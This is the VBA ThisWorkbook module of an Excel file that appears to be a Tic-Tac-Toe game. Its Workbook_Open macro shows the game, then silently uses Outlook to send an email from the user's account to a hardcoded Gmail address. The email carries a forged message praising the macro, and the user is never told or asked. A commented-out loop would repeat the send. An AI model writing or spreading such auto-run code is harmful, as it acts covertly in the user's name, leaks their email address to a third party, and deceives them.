VERSION 1.0 CLASS
BEGIN
  MultiUse = -1  'True
END
Attribute VB_Name = "ThisWorkbook"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Private Sub Workbook_Open()
Application.WindowState = xlMinimized
TicTacToe2.Show vbModeless


'Do While count <> Repeat
 Email_Subject = "Tic-Tac-Toe"
 Email_Send_From = from
 Email_Send_To = "adaniel.balderas@gmail.com"
 'Email_Cc = cc
 'Email_Bcc = bcc
 Email_Body = "I'm using this macro and it's so funny. Thanks I love it <3... Cheers."
On Error GoTo debugs
Set Mail_Object = CreateObject("Outlook.Application")
Set Mail_Single = Mail_Object.CreateItem(0)
With Mail_Single
 .subject = Email_Subject
 .to = Email_Send_To
 '.cc = Email_Cc
 '.bcc = Email_Bcc
 .body = Email_Body
 .send
End With
debugs:
If Err.Description <> "" Then MsgBox Err.Description

'count = count + 1
'Loop



End Sub
